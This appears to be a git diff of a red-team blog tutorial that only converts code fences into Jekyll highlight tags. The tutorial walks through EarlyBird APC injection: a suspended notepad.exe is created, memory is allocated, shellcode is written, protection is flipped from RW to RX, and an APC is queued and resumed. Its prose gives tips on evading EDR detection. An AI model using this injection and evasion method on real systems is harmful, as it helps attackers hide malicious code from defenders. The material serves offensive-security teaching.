@@ -149,7 +149,7 @@ In our proof-of-concept, we’ll use `notepad.exe` as the target process. This i
 
 By creating the process in a suspended state, we gain control before its primary thread starts running. This allows us to allocate memory, write our payload (shellcode), and queue an APC safely. We'll also set up some useful process and thread handles that we’ll use in the upcoming steps.
 
-```c
+{% highlight c %}
     INFO("Creating suspended process: notepad.exe");
 
     if (!CreateProcessA(
@@ -167,7 +167,7 @@ By creating the process in a suspended state, we gain control before its primary
 
     HANDLE victimProcess = pi.hProcess;
     HANDLE threadHandle = pi.hThread;
-```
+{% endhighlight %}
 
 ### VirtualAllocEx Block (Position 2)
 
@@ -179,7 +179,7 @@ Once the shellcode is safely written, we’ll switch the memory protection to `P
 
 This approach helps evade simple behavioral signatures. Many EDRs flag processes that allocate memory with `PAGE_EXECUTE_READWRITE` or write directly to `RX` memory as potentially malicious. By separating the write and execute phases, we blend in with more legitimate behavior patterns seen in everyday applications.
 
-```C
+{% highlight c %}
     INFO("Allocating memory in remote process");
 
     LPVOID shellAddress = VirtualAllocEx(
@@ -197,7 +197,7 @@ This approach helps evade simple behavioral signatures. Many EDRs flag processes
 
     OKAY("Memory allocated at remote address: %p", shellAddress);
 
-```
+{% endhighlight %}
 
 ### WriteProcessMemory Block (Position 3)
 
@@ -207,7 +207,7 @@ We’ll use the `WriteProcessMemory` API to copy our shellcode into the memory w
 
 At this point, there’s no execution involved — we’re merely placing the shellcode into memory. Since the memory is still marked as `PAGE_READWRITE`, this write operation shouldn't raise suspicion, especially in a benign process like `notepad.exe`.
 
-```C
+{% highlight c %}
     INFO("Writing shellcode into remote process");
 
     if (!WriteProcessMemory(
@@ -222,7 +222,7 @@ At this point, there’s no execution involved — we’re merely placing the sh
     }
 
     OKAY("Shellcode written to remote memory");
-```
+{% endhighlight %}
 
 ### VirtualProtectEx Block (Position 4)
 
@@ -234,7 +234,7 @@ To prepare the memory for execution, we use the `VirtualProtectEx` API to change
 
 This change is a crucial part of the injection chain, and it’s also where many EDRs may pay closer attention. It’s one of the behavioral indicators that shellcode is about to be executed, so red teamers may consider applying more subtle permission-flipping techniques or even avoiding this API if they aim to stay low and slow.
 
-```C
+{% highlight c %}
     INFO("Changing memory protection to PAGE_EXECUTE_READ (RW -> RX)");
 
     DWORD oldProtect = 0;
@@ -250,7 +250,7 @@ This change is a crucial part of the injection chain, and it’s also where many
     }
 
     OKAY("Memory protection changed successfully");
-```
+{% endhighlight %}
 
 ### QueueUserAPC Block (Position 5)
 
@@ -262,7 +262,7 @@ This is the key mechanism behind the **EarlyBird** injection technique — by in
 
 Queuing the APC does not immediately execute the shellcode — it simply lines it up. The thread still needs to be resumed for the shellcode to run, which we’ll handle in the next step.
 
-```C
+{% highlight c %}
     INFO("Queuing APC for execution");
 
     if (QueueUserAPC(
@@ -276,7 +276,7 @@ Queuing the APC does not immediately execute the shellcode — it simply lines i
     }
 
     OKAY("APC successfully queued");
-```
+{% endhighlight %}
 
 ### ResumeThread and Cleanup Block (Position 6)
 
@@ -290,7 +290,7 @@ To maintain clean execution and avoid leaving zombie processes or open handles, 
 
 This clean-up is good operational hygiene and prevents suspicious artifacts from lingering.
 
-```C
+{% highlight c %}
     INFO("Press ENTER to resume thread and trigger shellcode............");
     getchar();
 
@@ -303,7 +303,7 @@ This clean-up is good operational hygiene and prevents suspicious artifacts from
     // Cleanup
     CloseHandle(threadHandle);
     CloseHandle(victimProcess);
-```
+{% endhighlight %}
 
 ## Testing the EarlyBird Injector
 
